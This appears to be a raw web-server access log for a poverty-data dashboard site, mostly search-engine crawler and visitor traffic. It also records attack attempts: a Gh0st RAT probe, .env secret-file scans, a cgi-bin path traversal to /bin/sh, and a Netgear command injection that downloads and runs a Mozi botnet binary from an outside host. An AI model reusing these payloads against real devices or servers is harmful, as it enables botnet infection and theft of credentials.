66.249.64.253 - - [17/Nov/2021:02:08:36 +0000] "POST /_dash-update-component HTTP/1.1" 200 90 "https://povertydata.org/Turkmenistan" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/95.0.4638.69 Safari/537.36"
66.249.64.253 - - [17/Nov/2021:02:08:37 +0000] "POST /_dash-update-component HTTP/1.1" 200 2669 "https://povertydata.org/Turkmenistan" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/95.0.4638.69 Safari/537.36"
186.33.92.34 - - [17/Nov/2021:02:08:55 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
66.249.64.251 - - [17/Nov/2021:02:14:27 +0000] "GET /Ghana HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.226 - - [17/Nov/2021:02:16:34 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Ghana" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:02:16:35 +0000] "POST /_dash-update-component HTTP/1.1" 200 83 "https://povertydata.org/Ghana" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:02:16:36 +0000] "POST /_dash-update-component HTTP/1.1" 200 2698 "https://povertydata.org/Ghana" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.146.164.110 - - [17/Nov/2021:02:18:13 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.240.205.34 - - [17/Nov/2021:02:24:58 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"
213.59.123.122 - - [17/Nov/2021:02:27:56 +0000] "GET /wp-login.php HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
213.59.123.122 - - [17/Nov/2021:02:27:56 +0000] "GET /wp-login.php HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
213.59.123.122 - - [17/Nov/2021:02:27:56 +0000] "GET /wp-login.php HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
213.59.123.122 - - [17/Nov/2021:02:27:56 +0000] "GET /wp-login.php HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
213.59.123.122 - - [17/Nov/2021:02:27:56 +0000] "GET /wp-login.php HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
66.249.64.226 - - [17/Nov/2021:02:29:27 +0000] "GET /Cambodia HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
138.246.253.24 - - [17/Nov/2021:02:37:21 +0000] "GET /robots.txt HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36"
184.105.139.70 - - [17/Nov/2021:02:40:23 +0000] "GET / HTTP/1.1" 200 144683 "-" "-"
66.249.64.226 - - [17/Nov/2021:02:44:27 +0000] "GET /Vietnam HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
34.77.162.17 - - [17/Nov/2021:02:45:03 +0000] "GET / HTTP/1.1" 200 144683 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
35.211.91.181 - - [17/Nov/2021:02:52:01 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.211.91.181 - - [17/Nov/2021:02:52:02 +0000] "POST / HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.133.18.100 - - [17/Nov/2021:02:55:23 +0000] "GET / HTTP/1.1" 200 13270 "http://172.104.245.213:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
185.53.90.24 - - [17/Nov/2021:02:57:29 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
66.249.64.253 - - [17/Nov/2021:02:59:27 +0000] "GET /Eswatini HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.36.148.101 - - [17/Nov/2021:03:05:09 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.82 - - [17/Nov/2021:03:05:09 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_renderer/react@16.v1_9_0m1611082192.14.0.min.js HTTP/1.1" 200 4898 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_renderer/prop-types@15.v1_9_0m1611082192.7.2.min.js HTTP/1.1" 200 832 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_table/bundle.v4_11_2m1611087174.js HTTP/1.1" 200 11013 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_renderer/polyfill@7.v1_9_0m1611082192.8.7.min.js HTTP/1.1" 200 34243 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_renderer/react-dom@16.v1_9_0m1611082192.14.0.min.js HTTP/1.1" 200 38049 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_core_components/dash_core_components-shared.v1_15_0m1611086582.js HTTP/1.1" 200 9685 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_bootstrap_components/_components/dash_bootstrap_components.v0_11_3m1618740747.min.js HTTP/1.1" 200 54303 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_html_components/dash_html_components.v1_1_2m1611087126.min.js HTTP/1.1" 200 18907 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_renderer/dash_renderer.v1_9_0m1611082209.min.js HTTP/1.1" 200 59217 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_core_components/dash_core_components.v1_15_0m1611086582.min.js HTTP/1.1" 200 118829 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-dependencies HTTP/1.1" 200 430 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-layout HTTP/1.1" 200 2416 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "POST /_dash-update-component HTTP/1.1" 200 7106 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_core_components/async-graph.v1_15_0m1611086576.js HTTP/1.1" 200 5332 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_core_components/async-dropdown.v1_15_0m1611086576.js HTTP/1.1" 200 30740 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_core_components/async-markdown.v1_15_0m1611086576.js HTTP/1.1" 200 59335 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:10 +0000] "GET /_dash-component-suites/dash_core_components/async-slider.v1_15_0m1611086576.js HTTP/1.1" 200 28563 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:11 +0000] "POST /_dash-update-component HTTP/1.1" 200 3569 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:11 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:11 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:11 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:11 +0000] "POST /_dash-update-component HTTP/1.1" 200 3623 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:11 +0000] "GET /_dash-component-suites/dash_core_components/async-highlight.v1_15_0m1611086576.js HTTP/1.1" 200 22977 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:11 +0000] "GET /_dash-component-suites/dash_table/async-table.v4_11_2m1611087157.js HTTP/1.1" 200 92275 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:11 +0000] "GET /_dash-component-suites/dash_core_components/async-plotlyjs.v1_15_0m1611086576.js HTTP/1.1" 200 1034213 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:11 +0000] "POST /_dash-update-component HTTP/1.1" 200 2054 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
168.119.65.45 - - [17/Nov/2021:03:05:11 +0000] "POST /_dash-update-component HTTP/1.1" 200 43039 "http://povertydata.org/" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
198.98.49.124 - - [17/Nov/2021:03:15:42 +0000] "GET / HTTP/1.1" 200 13270 "-" "Linux Gnu (cow)"
54.75.197.188 - - [17/Nov/2021:03:17:48 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0"
66.249.64.231 - - [17/Nov/2021:03:21:56 +0000] "GET /l/Malta HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
61.242.40.5 - - [17/Nov/2021:03:28:26 +0000] "POST /HNAP1/ HTTP/1.0" 400 0 "-" "-"
66.249.64.253 - - [17/Nov/2021:03:29:26 +0000] "GET /Korea,%20Rep. HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.146.164.110 - - [17/Nov/2021:03:30:09 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.64.251 - - [17/Nov/2021:03:31:11 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Korea,%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:03:31:11 +0000] "GET /_dash-component-suites/dash_core_components/async-dropdown.v1_15_0m1611086576.js HTTP/1.1" 200 30740 "https://povertydata.org/Korea,%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [17/Nov/2021:03:31:12 +0000] "POST /_dash-update-component HTTP/1.1" 200 89 "https://povertydata.org/Korea,%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:03:31:12 +0000] "POST /_dash-update-component HTTP/1.1" 200 1898 "https://povertydata.org/Korea,%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.233 - - [17/Nov/2021:03:48:20 +0000] "GET /_dash-dependencies HTTP/1.1" 200 430 "http://povertydata.org/l/Germany" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [17/Nov/2021:03:50:10 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Venezuela,%20RB" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/95.0.4638.69 Safari/537.36"
66.249.64.253 - - [17/Nov/2021:03:50:11 +0000] "POST /_dash-update-component HTTP/1.1" 200 91 "https://povertydata.org/Venezuela,%20RB" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/95.0.4638.69 Safari/537.36"
66.249.64.251 - - [17/Nov/2021:03:50:12 +0000] "POST /_dash-update-component HTTP/1.1" 200 1899 "https://povertydata.org/Venezuela,%20RB" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/95.0.4638.69 Safari/537.36"
66.249.64.229 - - [17/Nov/2021:03:55:03 +0000] "GET /_dash-component-suites/dash_core_components/dash_core_components.v1_15_0m1611086582.min.js HTTP/1.1" 200 118829 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.4 - - [17/Nov/2021:03:55:04 +0000] "GET /_dash-component-suites/dash_renderer/react@16.v1_9_0m1611082192.14.0.min.js HTTP/1.1" 200 4898 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.233 - - [17/Nov/2021:03:55:04 +0000] "GET /_dash-dependencies HTTP/1.1" 200 430 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.233 - - [17/Nov/2021:03:55:05 +0000] "GET /_dash-layout HTTP/1.1" 200 2416 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.229 - - [17/Nov/2021:03:55:06 +0000] "POST /_dash-update-component HTTP/1.1" 200 7106 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.231 - - [17/Nov/2021:03:55:06 +0000] "GET /_dash-component-suites/dash_core_components/async-graph.v1_15_0m1611086576.js HTTP/1.1" 200 5332 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.229 - - [17/Nov/2021:03:55:07 +0000] "POST /_dash-update-component HTTP/1.1" 200 3569 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.231 - - [17/Nov/2021:03:55:08 +0000] "POST /_dash-update-component HTTP/1.1" 200 3623 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.231 - - [17/Nov/2021:03:55:08 +0000] "POST /_dash-update-component HTTP/1.1" 200 43039 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.231 - - [17/Nov/2021:03:55:09 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.229 - - [17/Nov/2021:03:55:09 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.231 - - [17/Nov/2021:03:55:10 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.229 - - [17/Nov/2021:03:55:11 +0000] "POST /_dash-update-component HTTP/1.1" 200 2054 "http://povertydata.org/l/Egypt,%20Arab%20Rep." "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.229 - - [17/Nov/2021:04:03:25 +0000] "POST /_dash-update-component HTTP/1.1" 200 7106 "http://povertydata.org/l/Malta" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.233 - - [17/Nov/2021:04:03:25 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.146.164.110 - - [17/Nov/2021:04:11:44 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 166 "-" "-"
185.254.31.122 - - [17/Nov/2021:04:21:27 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.31.122 - - [17/Nov/2021:04:21:27 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.31.122 - - [17/Nov/2021:04:21:27 +0000] "POST /.env HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.31.122 - - [17/Nov/2021:04:21:28 +0000] "POST /.env HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.189.182.234 - - [17/Nov/2021:04:22:54 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
60.191.125.35 - - [17/Nov/2021:04:30:15 +0000] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
35.233.62.116 - - [17/Nov/2021:04:58:20 +0000] "GET / HTTP/1.1" 200 13270 "-" "python-requests/2.26.0"
115.55.5.254 - - [17/Nov/2021:05:03:49 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.55.5.254:59799/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 200 83110 "-" "-"
134.209.90.83 - - [17/Nov/2021:05:13:24 +0000] "GET / HTTP/1.0" 200 133294 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
185.200.158.210 - - [17/Nov/2021:05:17:03 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
51.222.253.20 - - [17/Nov/2021:05:19:10 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
134.209.90.83 - - [17/Nov/2021:05:25:29 +0000] "HEAD / HTTP/1.1" 200 0 "-" "-"
180.149.125.167 - - [17/Nov/2021:05:45:48 +0000] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
94.21.219.211 - - [17/Nov/2021:05:50:13 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:14 +0000] "GET /_dash-layout HTTP/1.1" 200 2416 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:14 +0000] "GET /_dash-dependencies HTTP/1.1" 200 430 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:14 +0000] "GET /assets/iconmonstr-github-1-64.png HTTP/1.1" 304 0 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:14 +0000] "GET /assets/iconmonstr-twitter-4-64%20(1).png HTTP/1.1" 304 0 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
